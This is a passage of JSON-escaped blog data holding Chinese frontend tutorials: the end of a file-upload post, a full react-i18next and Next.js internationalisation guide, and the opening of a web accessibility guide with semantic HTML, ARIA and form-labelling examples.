\u62d6\u62fd\u4e0a\u4f20\\n\\n```tsx\\nfunction DragDropUpload() {\\n  const [isDragging, setIsDragging] = useState(false);\\n\\n  const handleDrop = (e: React.DragEvent) => {\\n    e.preventDefault();\\n    setIsDragging(false);\\n    \\n    const files = Array.from(e.dataTransfer.files);\\n    files.forEach(uploadFile);\\n  };\\n\\n  return (\\n    <div\\n      onDragOver={(e) => {\\n        e.preventDefault();\\n        setIsDragging(true);\\n      }}\\n      onDragLeave={() => setIsDragging(false)}\\n      onDrop={handleDrop}\\n      className={`drop-zone ${isDragging ? \'active\' : \'\'}`}\\n    >\\n      \u62d6\u62fd\u6587\u4ef6\u5230\u8fd9\u91cc\u4e0a\u4f20\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u6587\u4ef6\u9a8c\u8bc1\\n   - \u7c7b\u578b\u68c0\u67e5\uff08MIME + \u6269\u5c55\u540d\uff09\\n   - \u5927\u5c0f\u9650\u5236\\n   - \u5185\u5bb9\u68c0\u67e5\uff08\u9632\u6076\u610f\u6587\u4ef6\uff09\\n\\n2. \u7528\u6237\u4f53\u9a8c\\n   - \u8fdb\u5ea6\u663e\u793a\\n   - \u53d6\u6d88\u4e0a\u4f20\\n   - \u9519\u8bef\u91cd\u8bd5\\n   - \u9884\u89c8\u529f\u80fd\\n\\n3. \u6027\u80fd\u4f18\u5316\\n   - \u5206\u7247\u4e0a\u4f20\\n   - \u5e76\u53d1\u63a7\u5236\\n   - \u538b\u7f29\u5904\u7406\\n\\n4. \u5b89\u5168\\n   - \u6587\u4ef6\u540d\u5904\u7406\\n   - \u5b58\u50a8\u9694\u79bb\\n   - \u8bbf\u95ee\u63a7\u5236\\n```\\n\\n---\\n\\n\u6587\u4ef6\u4e0a\u4f20\u770b\u4f3c\u7b80\u5355\uff0c\u8981\u505a\u597d\u9700\u8981\u8003\u8651\u5f88\u591a\u7ec6\u8282\u3002\u6839\u636e\u4e1a\u52a1\u573a\u666f\u9009\u62e9\u5408\u9002\u7684\u65b9\u6848\u3002"},{"id":"i18n-guide","metadata":{"permalink":"/blog/i18n-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-02-20-i18n.md","source":"@site/blog/2025-02-20-i18n.md","title":"\u56fd\u9645\u5316 (i18n) \u6700\u4f73\u5b9e\u8df5","description":"\u56fd\u9645\u5316\u8ba9\u5e94\u7528\u89e6\u8fbe\u5168\u7403\u7528\u6237\u3002\u672c\u6587\u4ecb\u7ecd React \u5e94\u7528\u7684\u56fd\u9645\u5316\u5b9e\u73b0\u65b9\u6848\u548c\u6700\u4f73\u5b9e\u8df5\u3002","date":"2025-02-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u56fd\u9645\u5316","permalink":"/blog/tags/\u56fd\u9645\u5316"},{"inline":true,"label":"i18n","permalink":"/blog/tags/i-18-n"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":3.82,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"i18n-guide","title":"\u56fd\u9645\u5316 (i18n) \u6700\u4f73\u5b9e\u8df5","authors":"mason","tags":["\u56fd\u9645\u5316","i18n","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"\u6587\u4ef6\u4e0a\u4f20\u5b8c\u6574\u65b9\u6848","permalink":"/blog/file-upload"},"nextItem":{"title":"\u65e0\u969c\u788d (a11y) \u5f00\u53d1\u6307\u5357","permalink":"/blog/accessibility-guide"}},"content":"\u56fd\u9645\u5316\u8ba9\u5e94\u7528\u89e6\u8fbe\u5168\u7403\u7528\u6237\u3002\u672c\u6587\u4ecb\u7ecd React \u5e94\u7528\u7684\u56fd\u9645\u5316\u5b9e\u73b0\u65b9\u6848\u548c\u6700\u4f73\u5b9e\u8df5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u56fd\u9645\u5316\u57fa\u7840\\n\\n### \u76f8\u5173\u672f\u8bed\\n\\n| \u672f\u8bed | \u5168\u79f0 | \u542b\u4e49 |\\n|------|------|------|\\n| i18n | Internationalization | \u56fd\u9645\u5316\uff08\u4f7f\u5e94\u7528\u652f\u6301\u591a\u8bed\u8a00\uff09 |\\n| l10n | Localization | \u672c\u5730\u5316\uff08\u7ffb\u8bd1\u548c\u9002\u914d\uff09 |\\n| locale | - | \u533a\u57df\u8bbe\u7f6e\uff08zh-CN, en-US\uff09 |\\n\\n### \u9700\u8981\u56fd\u9645\u5316\u7684\u5185\u5bb9\\n\\n```markdown\\n- \u6587\u672c\u5185\u5bb9\\n- \u65e5\u671f\u65f6\u95f4\u683c\u5f0f\\n- \u6570\u5b57\u548c\u8d27\u5e01\u683c\u5f0f\\n- \u6392\u5e8f\u89c4\u5219\\n- \u6587\u672c\u65b9\u5411 (LTR/RTL)\\n- \u56fe\u7247\u548c\u56fe\u6807\\n```\\n\\n---\\n\\n## \ud83d\udce6 react-i18next\\n\\n### \u5b89\u88c5\\n\\n```bash\\nnpm install react-i18next i18next i18next-browser-languagedetector\\n```\\n\\n### \u914d\u7f6e\\n\\n```typescript\\n// src/i18n/index.ts\\nimport i18n from \'i18next\';\\nimport { initReactI18next } from \'react-i18next\';\\nimport LanguageDetector from \'i18next-browser-languagedetector\';\\n\\nimport en from \'./locales/en.json\';\\nimport zh from \'./locales/zh.json\';\\n\\ni18n\\n  .use(LanguageDetector)\\n  .use(initReactI18next)\\n  .init({\\n    resources: {\\n      en: { translation: en },\\n      zh: { translation: zh },\\n    },\\n    fallbackLng: \'en\',\\n    interpolation: {\\n      escapeValue: false,\\n    },\\n    detection: {\\n      order: [\'localStorage\', \'navigator\'],\\n      caches: [\'localStorage\'],\\n    },\\n  });\\n\\nexport default i18n;\\n```\\n\\n### \u7ffb\u8bd1\u6587\u4ef6\\n\\n```json\\n// src/i18n/locales/en.json\\n{\\n  \\"common\\": {\\n    \\"welcome\\": \\"Welcome\\",\\n    \\"login\\": \\"Login\\",\\n    \\"logout\\": \\"Logout\\"\\n  },\\n  \\"home\\": {\\n    \\"title\\": \\"Home Page\\",\\n    \\"greeting\\": \\"Hello, {{name}}!\\"\\n  },\\n  \\"errors\\": {\\n    \\"required\\": \\"This field is required\\",\\n    \\"email\\": \\"Invalid email address\\"\\n  }\\n}\\n```\\n\\n```json\\n// src/i18n/locales/zh.json\\n{\\n  \\"common\\": {\\n    \\"welcome\\": \\"\u6b22\u8fce\\",\\n    \\"login\\": \\"\u767b\u5f55\\",\\n    \\"logout\\": \\"\u9000\u51fa\\"\\n  },\\n  \\"home\\": {\\n    \\"title\\": \\"\u9996\u9875\\",\\n    \\"greeting\\": \\"\u4f60\u597d\uff0c{{name}}\uff01\\"\\n  },\\n  \\"errors\\": {\\n    \\"required\\": \\"\u6b64\u5b57\u6bb5\u5fc5\u586b\\",\\n    \\"email\\": \\"\u90ae\u7bb1\u683c\u5f0f\u4e0d\u6b63\u786e\\"\\n  }\\n}\\n```\\n\\n### \u4f7f\u7528\\n\\n```tsx\\n// \u5f15\u5165 i18n \u914d\u7f6e\\nimport \'./i18n\';\\n\\n// \u4f7f\u7528 Hook\\nimport { useTranslation } from \'react-i18next\';\\n\\nfunction HomePage() {\\n  const { t, i18n } = useTranslation();\\n\\n  return (\\n    <div>\\n      <h1>{t(\'home.title\')}</h1>\\n      <p>{t(\'home.greeting\', { name: \'John\' })}</p>\\n      \\n      <button onClick={() => i18n.changeLanguage(\'en\')}>\\n        English\\n      </button>\\n      <button onClick={() => i18n.changeLanguage(\'zh\')}>\\n        \u4e2d\u6587\\n      </button>\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd22 \u590d\u6570\u548c\u63d2\u503c\\n\\n### \u590d\u6570\\n\\n```json\\n// en.json\\n{\\n  \\"items\\": {\\n    \\"count_one\\": \\"{{count}} item\\",\\n    \\"count_other\\": \\"{{count}} items\\"\\n  },\\n  \\"messages\\": {\\n    \\"count_zero\\": \\"No messages\\",\\n    \\"count_one\\": \\"1 message\\",\\n    \\"count_other\\": \\"{{count}} messages\\"\\n  }\\n}\\n```\\n\\n```tsx\\nt(\'items.count\', { count: 1 });  // \\"1 item\\"\\nt(\'items.count\', { count: 5 });  // \\"5 items\\"\\n```\\n\\n### \u5d4c\u5957\u63d2\u503c\\n\\n```json\\n{\\n  \\"user\\": {\\n    \\"info\\": \\"{{name}} has {{count}} posts\\"\\n  }\\n}\\n```\\n\\n```tsx\\nt(\'user.info\', { name: \'John\', count: 10 });\\n// \\"John has 10 posts\\"\\n```\\n\\n### \u5bcc\u6587\u672c\\n\\n```json\\n{\\n  \\"terms\\": \\"Please read our <link>terms of service</link>\\"\\n}\\n```\\n\\n```tsx\\nimport { Trans } from \'react-i18next\';\\n\\n<Trans i18nKey=\\"terms\\">\\n  Please read our <a href=\\"/terms\\">terms of service</a>\\n</Trans>\\n```\\n\\n---\\n\\n## \ud83d\udcc5 \u65e5\u671f\u548c\u6570\u5b57\u683c\u5f0f\u5316\\n\\n### Intl API\\n\\n```typescript\\n// \u65e5\u671f\u683c\u5f0f\u5316\\nconst date = new Date();\\n\\nnew Intl.DateTimeFormat(\'zh-CN\').format(date);\\n// \\"2025/2/20\\"\\n\\nnew Intl.DateTimeFormat(\'en-US\', {\\n  year: \'numeric\',\\n  month: \'long\',\\n  day: \'numeric\',\\n}).format(date);\\n// \\"February 20, 2025\\"\\n\\n// \u6570\u5b57\u683c\u5f0f\u5316\\nnew Intl.NumberFormat(\'zh-CN\').format(1234567.89);\\n// \\"1,234,567.89\\"\\n\\nnew Intl.NumberFormat(\'de-DE\').format(1234567.89);\\n// \\"1.234.567,89\\"\\n\\n// \u8d27\u5e01\u683c\u5f0f\u5316\\nnew Intl.NumberFormat(\'zh-CN\', {\\n  style: \'currency\',\\n  currency: \'CNY\',\\n}).format(99.99);\\n// \\"\xa599.99\\"\\n\\nnew Intl.NumberFormat(\'en-US\', {\\n  style: \'currency\',\\n  currency: \'USD\',\\n}).format(99.99);\\n// \\"$99.99\\"\\n```\\n\\n### \u5c01\u88c5 Hook\\n\\n```typescript\\nimport { useTranslation } from \'react-i18next\';\\n\\nfunction useFormatter() {\\n  const { i18n } = useTranslation();\\n  const locale = i18n.language;\\n\\n  return {\\n    formatDate: (date: Date, options?: Intl.DateTimeFormatOptions) => {\\n      return new Intl.DateTimeFormat(locale, options).format(date);\\n    },\\n    formatNumber: (num: number, options?: Intl.NumberFormatOptions) => {\\n      return new Intl.NumberFormat(locale, options).format(num);\\n    },\\n    formatCurrency: (amount: number, currency = \'USD\') => {\\n      return new Intl.NumberFormat(locale, {\\n        style: \'currency\',\\n        currency,\\n      }).format(amount);\\n    },\\n  };\\n}\\n\\n// \u4f7f\u7528\\nfunction Price({ amount }: { amount: number }) {\\n  const { formatCurrency } = useFormatter();\\n  return <span>{formatCurrency(amount, \'CNY\')}</span>;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u8bed\u8a00\u5207\u6362\\n\\n### \u8bed\u8a00\u9009\u62e9\u5668\\n\\n```tsx\\nfunction LanguageSelector() {\\n  const { i18n } = useTranslation();\\n\\n  const languages = [\\n    { code: \'en\', name: \'English\', flag: \'\ud83c\uddfa\ud83c\uddf8\' },\\n    { code: \'zh\', name: \'\u4e2d\u6587\', flag: \'\ud83c\udde8\ud83c\uddf3\' },\\n    { code: \'ja\', name: \'\u65e5\u672c\u8a9e\', flag: \'\ud83c\uddef\ud83c\uddf5\' },\\n  ];\\n\\n  return (\\n    <select\\n      value={i18n.language}\\n      onChange={(e) => i18n.changeLanguage(e.target.value)}\\n    >\\n      {languages.map((lang) => (\\n        <option key={lang.code} value={lang.code}>\\n          {lang.flag} {lang.name}\\n        </option>\\n      ))}\\n    </select>\\n  );\\n}\\n```\\n\\n### \u6301\u4e45\u5316\\n\\n```typescript\\n// \u81ea\u52a8\u4fdd\u5b58\u5230 localStorage\\ni18n.on(\'languageChanged\', (lng) => {\\n  localStorage.setItem(\'language\', lng);\\n  document.documentElement.lang = lng;\\n});\\n```\\n\\n---\\n\\n## \ud83c\udf10 Next.js \u56fd\u9645\u5316\\n\\n### \u914d\u7f6e\\n\\n```typescript\\n// next.config.js\\nmodule.exports = {\\n  i18n: {\\n    locales: [\'en\', \'zh\', \'ja\'],\\n    defaultLocale: \'en\',\\n  },\\n};\\n```\\n\\n### \u8def\u7531\\n\\n```markdown\\n/           \u2192 \u82f1\u6587\uff08\u9ed8\u8ba4\uff09\\n/zh         \u2192 \u4e2d\u6587\\n/ja         \u2192 \u65e5\u8bed\\n/zh/about   \u2192 \u4e2d\u6587\u5173\u4e8e\u9875\\n```\\n\\n### \u4f7f\u7528\\n\\n```tsx\\nimport { useRouter } from \'next/router\';\\n\\nfunction Page() {\\n  const { locale, locales, push, asPath } = useRouter();\\n\\n  const changeLocale = (newLocale: string) => {\\n    push(asPath, asPath, { locale: newLocale });\\n  };\\n\\n  return (\\n    <div>\\n      <p>Current: {locale}</p>\\n      {locales?.map((l) => (\\n        <button key={l} onClick={() => changeLocale(l)}>\\n          {l}\\n        </button>\\n      ))}\\n    </div>\\n  );\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcc2 \u7ffb\u8bd1\u7ba1\u7406\\n\\n### \u76ee\u5f55\u7ed3\u6784\\n\\n```\\nsrc/i18n/\\n\u251c\u2500\u2500 index.ts\\n\u2514\u2500\u2500 locales/\\n    \u251c\u2500\u2500 en/\\n    \u2502   \u251c\u2500\u2500 common.json\\n    \u2502   \u251c\u2500\u2500 home.json\\n    \u2502   \u2514\u2500\u2500 errors.json\\n    \u2514\u2500\u2500 zh/\\n        \u251c\u2500\u2500 common.json\\n        \u251c\u2500\u2500 home.json\\n        \u2514\u2500\u2500 errors.json\\n```\\n\\n### \u547d\u540d\u7a7a\u95f4\\n\\n```typescript\\ni18n.init({\\n  ns: [\'common\', \'home\', \'errors\'],\\n  defaultNS: \'common\',\\n});\\n```\\n\\n```tsx\\n// \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\\nconst { t } = useTranslation(\'home\');\\nt(\'title\');  // \u4ece home.json\\n\\n// \u8de8\u547d\u540d\u7a7a\u95f4\\nt(\'common:login\');  // \u4ece common.json\\n```\\n\\n---\\n\\n## \u2705 \u6700\u4f73\u5b9e\u8df5\\n\\n### \u7ffb\u8bd1\u952e\u547d\u540d\\n\\n```json\\n// \u2705 \u597d\u7684\u547d\u540d\\n{\\n  \\"user.profile.title\\": \\"Profile\\",\\n  \\"user.profile.edit\\": \\"Edit Profile\\",\\n  \\"error.network\\": \\"Network error\\"\\n}\\n\\n// \u274c \u4e0d\u597d\u7684\u547d\u540d\\n{\\n  \\"text1\\": \\"Profile\\",\\n  \\"btn1\\": \\"Edit Profile\\"\\n}\\n```\\n\\n### \u907f\u514d\u62fc\u63a5\\n\\n```tsx\\n// \u274c \u4e0d\u597d\\nt(\'hello\') + \' \' + name + \'!\'\\n\\n// \u2705 \u597d\\nt(\'greeting\', { name })\\n```\\n\\n### \u63d0\u53d6\u5e38\u91cf\\n\\n```typescript\\n// \u7ffb\u8bd1\u952e\u5e38\u91cf\\nexport const I18N_KEYS = {\\n  COMMON: {\\n    SUBMIT: \'common.submit\',\\n    CANCEL: \'common.cancel\',\\n  },\\n} as const;\\n\\n// \u4f7f\u7528\\nt(I18N_KEYS.COMMON.SUBMIT);\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5de5\u5177\u63a8\u8350\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| Crowdin | \u7ffb\u8bd1\u7ba1\u7406\u5e73\u53f0 |\\n| Lokalise | \u7ffb\u8bd1\u534f\u4f5c |\\n| i18next-scanner | \u63d0\u53d6\u7ffb\u8bd1\u952e |\\n| i18n-ally | VS Code \u6269\u5c55 |\\n\\n---\\n\\n\u56fd\u9645\u5316\u662f\u4e2a\u6301\u7eed\u7684\u8fc7\u7a0b\u3002\u4ece\u9879\u76ee\u5f00\u59cb\u5c31\u8003\u8651 i18n\uff0c\u6bd4\u540e\u671f\u6dfb\u52a0\u5bb9\u6613\u5f97\u591a\u3002"},{"id":"accessibility-guide","metadata":{"permalink":"/blog/accessibility-guide","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-02-05-a11y.md","source":"@site/blog/2025-02-05-a11y.md","title":"\u65e0\u969c\u788d (a11y) \u5f00\u53d1\u6307\u5357","description":"\u65e0\u969c\u788d\u8bbe\u8ba1\u8ba9\u6240\u6709\u7528\u6237\u90fd\u80fd\u4f7f\u7528\u4f60\u7684\u5e94\u7528\u3002\u672c\u6587\u4ecb\u7ecd Web \u65e0\u969c\u788d\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u65b9\u6cd5\u3002","date":"2025-02-05T00:00:00.000Z","tags":[{"inline":true,"label":"\u65e0\u969c\u788d","permalink":"/blog/tags/\u65e0\u969c\u788d"},{"inline":true,"label":"a11y","permalink":"/blog/tags/a-11-y"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"\u7528\u6237\u4f53\u9a8c","permalink":"/blog/tags/\u7528\u6237\u4f53\u9a8c"}],"readingTime":4.66,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"accessibility-guide","title":"\u65e0\u969c\u788d (a11y) \u5f00\u53d1\u6307\u5357","authors":"mason","tags":["\u65e0\u969c\u788d","a11y","\u524d\u7aef","\u7528\u6237\u4f53\u9a8c"]},"unlisted":false,"prevItem":{"title":"\u56fd\u9645\u5316 (i18n) \u6700\u4f73\u5b9e\u8df5","permalink":"/blog/i18n-guide"},"nextItem":{"title":"PWA \u6e10\u8fdb\u5f0f\u5e94\u7528\u5f00\u53d1\u6307\u5357","permalink":"/blog/pwa-guide"}},"content":"\u65e0\u969c\u788d\u8bbe\u8ba1\u8ba9\u6240\u6709\u7528\u6237\u90fd\u80fd\u4f7f\u7528\u4f60\u7684\u5e94\u7528\u3002\u672c\u6587\u4ecb\u7ecd Web \u65e0\u969c\u788d\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u8df5\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4ec0\u4e48\u662f Web \u65e0\u969c\u788d\\n\\nWeb \u65e0\u969c\u788d (Accessibility, \u7b80\u79f0 a11y) \u786e\u4fdd\u6b8b\u969c\u4eba\u58eb\u4e5f\u80fd\uff1a\\n\\n- \u611f\u77e5\u5185\u5bb9\\n- \u7406\u89e3\u4fe1\u606f\\n- \u5bfc\u822a\u64cd\u4f5c\\n- \u8d21\u732e\u5185\u5bb9\\n\\n### \u53d7\u76ca\u4eba\u7fa4\\n\\n```markdown\\n- \u89c6\u89c9\u969c\u788d\uff08\u5931\u660e\u3001\u8272\u76f2\u3001\u4f4e\u89c6\u529b\uff09\\n- \u542c\u89c9\u969c\u788d\uff08\u8033\u804b\u3001\u542c\u529b\u4e0b\u964d\uff09\\n- \u8fd0\u52a8\u969c\u788d\uff08\u65e0\u6cd5\u4f7f\u7528\u9f20\u6807\uff09\\n- \u8ba4\u77e5\u969c\u788d\uff08\u9605\u8bfb\u56f0\u96be\uff09\\n- \u4e34\u65f6\u969c\u788d\uff08\u624b\u53d7\u4f24\u3001\u73af\u5883\u5608\u6742\uff09\\n- \u8001\u5e74\u7528\u6237\\n```\\n\\n---\\n\\n## \ud83d\udccb WCAG \u6307\u5357\\n\\nWCAG (Web Content Accessibility Guidelines) \u56db\u5927\u539f\u5219\uff1a\\n\\n| \u539f\u5219 | \u82f1\u6587 | \u8bf4\u660e |\\n|------|------|------|\\n| \u53ef\u611f\u77e5 | Perceivable | \u7528\u6237\u80fd\u611f\u77e5\u5185\u5bb9 |\\n| \u53ef\u64cd\u4f5c | Operable | \u7528\u6237\u80fd\u64cd\u4f5c\u754c\u9762 |\\n| \u53ef\u7406\u89e3 | Understandable | \u7528\u6237\u80fd\u7406\u89e3\u5185\u5bb9 |\\n| \u5065\u58ee\u6027 | Robust | \u517c\u5bb9\u5404\u79cd\u8f85\u52a9\u6280\u672f |\\n\\n---\\n\\n## \ud83c\udfd7\ufe0f \u8bed\u4e49\u5316 HTML\\n\\n### \u4f7f\u7528\u6b63\u786e\u7684\u6807\u7b7e\\n\\n```html\\n\x3c!-- \u274c \u4e0d\u597d --\x3e\\n<div class=\\"header\\">\\n  <div class=\\"nav\\">\\n    <div class=\\"nav-item\\" onclick=\\"navigate()\\">\u9996\u9875</div>\\n  </div>\\n</div>\\n<div class=\\"main\\">\\n  <div class=\\"article\\">\\n    <div class=\\"title\\">\u6587\u7ae0\u6807\u9898</div>\\n  </div>\\n</div>\\n\\n\x3c!-- \u2705 \u597d --\x3e\\n<header>\\n  <nav>\\n    <a href=\\"/\\">\u9996\u9875</a>\\n  </nav>\\n</header>\\n<main>\\n  <article>\\n    <h1>\u6587\u7ae0\u6807\u9898</h1>\\n  </article>\\n</main>\\n```\\n\\n### \u6807\u9898\u5c42\u7ea7\\n\\n```html\\n\x3c!-- \u274c \u8df3\u8fc7\u5c42\u7ea7 --\x3e\\n<h1>\u9875\u9762\u6807\u9898</h1>\\n<h3>\u5c0f\u8282\u6807\u9898</h3>\\n\\n\x3c!-- \u2705 \u6b63\u786e\u5c42\u7ea7 --\x3e\\n<h1>\u9875\u9762\u6807\u9898</h1>\\n<h2>\u7ae0\u8282\u6807\u9898</h2>\\n<h3>\u5c0f\u8282\u6807\u9898</h3>\\n```\\n\\n### \u5217\u8868\\n\\n```html\\n\x3c!-- \u65e0\u5e8f\u5217\u8868 --\x3e\\n<ul>\\n  <li>\u9879\u76ee\u4e00</li>\\n  <li>\u9879\u76ee\u4e8c</li>\\n</ul>\\n\\n\x3c!-- \u6709\u5e8f\u5217\u8868 --\x3e\\n<ol>\\n  <li>\u6b65\u9aa4\u4e00</li>\\n  <li>\u6b65\u9aa4\u4e8c</li>\\n</ol>\\n\\n\x3c!-- \u63cf\u8ff0\u5217\u8868 --\x3e\\n<dl>\\n  <dt>HTML</dt>\\n  <dd>\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00</dd>\\n</dl>\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u56fe\u7247\u65e0\u969c\u788d\\n\\n### alt \u5c5e\u6027\\n\\n```html\\n\x3c!-- \u4fe1\u606f\u6027\u56fe\u7247\uff1a\u63cf\u8ff0\u5185\u5bb9 --\x3e\\n<img src=\\"chart.png\\" alt=\\"2024\u5e74\u9500\u552e\u989d\u67f1\u72b6\u56fe\uff0cQ4\u6700\u9ad8\u8fbe100\u4e07\\">\\n\\n\x3c!-- \u88c5\u9970\u6027\u56fe\u7247\uff1a\u7a7aalt --\x3e\\n<img src=\\"decoration.png\\" alt=\\"\\">\\n\\n\x3c!-- \u529f\u80fd\u6027\u56fe\u7247\uff1a\u63cf\u8ff0\u529f\u80fd --\x3e\\n<button>\\n  <img src=\\"search.svg\\" alt=\\"\u641c\u7d22\\">\\n</button>\\n\\n\x3c!-- \u590d\u6742\u56fe\u7247\uff1a\u8be6\u7ec6\u63cf\u8ff0 --\x3e\\n<figure>\\n  <img src=\\"infographic.png\\" alt=\\"\u516c\u53f8\u7ec4\u7ec7\u67b6\u6784\u56fe\\" aria-describedby=\\"org-desc\\">\\n  <figcaption id=\\"org-desc\\">\\n    \u516c\u53f8\u5206\u4e3a\u4e09\u4e2a\u90e8\u95e8\uff1a\u6280\u672f\u90e8\u3001\u5e02\u573a\u90e8\u3001\u8fd0\u8425\u90e8...\\n  </figcaption>\\n</figure>\\n```\\n\\n---\\n\\n## \u2328\ufe0f \u952e\u76d8\u5bfc\u822a\\n\\n### \u7126\u70b9\u7ba1\u7406\\n\\n```css\\n/* \u4fdd\u7559\u7126\u70b9\u6837\u5f0f */\\n:focus {\\n  outline: 2px solid #3b82f6;\\n  outline-offset: 2px;\\n}\\n\\n/* \u53ea\u5728\u952e\u76d8\u5bfc\u822a\u65f6\u663e\u793a */\\n:focus:not(:focus-visible) {\\n  outline: none;\\n}\\n\\n:focus-visible {\\n  outline: 2px solid #3b82f6;\\n}\\n```\\n\\n### tabindex\\n\\n```html\\n\x3c!-- \u81ea\u7136\u53ef\u805a\u7126\u5143\u7d20 --\x3e\\n<a href=\\"#\\">\u94fe\u63a5</a>\\n<button>\u6309\u94ae</button>\\n<input type=\\"text\\">\\n\\n\x3c!-- \u6dfb\u52a0\u5230 Tab \u987a\u5e8f --\x3e\\n<div tabindex=\\"0\\">\u53ef\u805a\u7126\u7684 div</div>\\n\\n\x3c!-- \u53ef\u805a\u7126\u4f46\u4e0d\u5728 Tab \u987a\u5e8f\u4e2d --\x3e\\n<div tabindex=\\"-1\\">\u7a0b\u5e8f\u63a7\u5236\u7126\u70b9</div>\\n\\n\x3c!-- \u274c \u907f\u514d\u6b63\u6570 tabindex --\x3e\\n<div tabindex=\\"1\\">\u4e0d\u63a8\u8350</div>\\n```\\n\\n### \u8df3\u8fc7\u94fe\u63a5\\n\\n```html\\n<body>\\n  <a href=\\"#main-content\\" class=\\"skip-link\\">\\n    \u8df3\u5230\u4e3b\u8981\u5185\u5bb9\\n  </a>\\n  <header>...</header>\\n  <main id=\\"main-content\\">...</main>\\n</body>\\n\\n<style>\\n.skip-link {\\n  position: absolute;\\n  top: -40px;\\n  left: 0;\\n  padding: 8px;\\n  background: #000;\\n  color: #fff;\\n  z-index: 100;\\n}\\n\\n.skip-link:focus {\\n  top: 0;\\n}\\n</style>\\n```\\n\\n---\\n\\n## \ud83c\udff7\ufe0f ARIA \u5c5e\u6027\\n\\n### \u89d2\u8272 (role)\\n\\n```html\\n\x3c!-- \u5730\u6807\u89d2\u8272 --\x3e\\n<div role=\\"banner\\">\u9875\u5934</div>\\n<div role=\\"navigation\\">\u5bfc\u822a</div>\\n<div role=\\"main\\">\u4e3b\u5185\u5bb9</div>\\n<div role=\\"complementary\\">\u4fa7\u8fb9\u680f</div>\\n\\n\x3c!-- \u7ec4\u4ef6\u89d2\u8272 --\x3e\\n<div role=\\"button\\" tabindex=\\"0\\">\u81ea\u5b9a\u4e49\u6309\u94ae</div>\\n<div role=\\"dialog\\" aria-modal=\\"true\\">\u6a21\u6001\u6846</div>\\n<ul role=\\"tablist\\">\\n  <li role=\\"tab\\">\u6807\u7b7e1</li>\\n</ul>\\n```\\n\\n### \u72b6\u6001\u548c\u5c5e\u6027\\n\\n```html\\n\x3c!-- \u5c55\u5f00\u72b6\u6001 --\x3e\\n<button aria-expanded=\\"false\\" aria-controls=\\"menu\\">\\n  \u83dc\u5355\\n</button>\\n<ul id=\\"menu\\" hidden>...</ul>\\n\\n\x3c!-- \u9009\u4e2d\u72b6\u6001 --\x3e\\n<div role=\\"checkbox\\" aria-checked=\\"true\\">\u5df2\u9009\u4e2d</div>\\n\\n\x3c!-- \u7981\u7528\u72b6\u6001 --\x3e\\n<button aria-disabled=\\"true\\">\u7981\u7528\u6309\u94ae</button>\\n\\n\x3c!-- \u63cf\u8ff0\u5173\u8054 --\x3e\\n<input \\n  type=\\"text\\" \\n  aria-label=\\"\u641c\u7d22\\"\\n  aria-describedby=\\"search-hint\\"\\n>\\n<span id=\\"search-hint\\">\u8f93\u5165\u5173\u952e\u8bcd\u641c\u7d22\u6587\u7ae0</span>\\n```\\n\\n### \u5b9e\u65f6\u533a\u57df\\n\\n```html\\n\x3c!-- \u901a\u77e5\u66f4\u65b0 --\x3e\\n<div aria-live=\\"polite\\">\\n  \u8868\u5355\u5df2\u4fdd\u5b58\\n</div>\\n\\n\x3c!-- \u7d27\u6025\u901a\u77e5 --\x3e\\n<div aria-live=\\"assertive\\" role=\\"alert\\">\\n  \u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u91cd\u8bd5\\n</div>\\n```\\n\\n---\\n\\n## \ud83d\udcdd \u8868\u5355\u65e0\u969c\u788d\\n\\n### \u6807\u7b7e\u5173\u8054\\n\\n```html\\n\x3c!-- \u663e\u5f0f\u5173\u8054 --\x3e\\n<label for=\\"email\\">\u90ae\u7bb1</label>\\n<input type=\\"email\\" id=\\"email\\">\\n\\n\x3c!-- \u9690\u5f0f\u5173\u8054 --\x3e\\n<label>\\n  \u90ae\u7bb1\\n  <input type=\\"email\\">\\n</label>\\n\\n\x3c!-- \u9690\u85cf\u6807\u7b7e --\x3e\\n<label for=\\"search\\" class=\\"visually-hidden\\">\u641c\u7d22</label>\\n<input type=\\"search\\" id=\\"search\\" placeholder=\\"\u641c\u7d22...\\">\\n```\\n\\n### \u9519\u8bef\u63d0\u793a\\n\\n```html\\n<div>\\n  <label for=\\"email\\">\u90ae\u7bb1</label>\\n  <input \\n    type=\\"email\\" \\n    id=\\"email\\"\\n    aria-invalid=\\"true\\"\\n    aria-describedby=\\"email-error\\"\\n  >\\n  <span id=\\"email-error\\" role=\\"alert\\">\\n    \u8bf7\u8f93\u5165\u6709\u6548\u7684\u90ae\u7bb1\u5730\u5740\\n  </span>\\n</div>\\n```\\n\\n### \u5fc5\u586b\u5b57\u6bb5\\n\\n```html\\n<label for=\\"name\\">\\n  \u59d3\u540d <span aria-hidden=\\"true\\">*</span>\\n</label>\\n<input type=\\"text\\" id=\\"name\\" required 